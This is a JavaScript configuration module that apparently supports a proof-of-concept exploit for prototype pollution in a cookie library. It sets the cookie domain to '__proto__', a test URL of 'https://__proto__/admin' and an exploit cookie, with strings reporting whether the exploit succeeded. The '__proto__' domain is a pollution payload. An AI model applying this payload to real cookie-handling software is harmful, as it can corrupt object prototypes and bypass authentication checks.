// Configuration
const config = {
  cookieDomain: "__proto__",
  googleCookieDomain: "google.com",
  cookiePath: "/notauth",
  exploitCookieName: "Slonser",
  exploitCookieValue: "polluted",
  normalCookieName: "Auth",
  normalCookieValue: "Lol",
  testUrl: "https://__proto__/admin",
  normalUrl: "https://google.com/",
  rejectPublicSuffixes: false,
  exploitedSuccessfully: "EXPLOITED SUCCESSFULLY",
  exploitFailed: "EXPLOIT FAILED",
  exploitError: "Error during exploit attempt:",
};

module.exports = config;
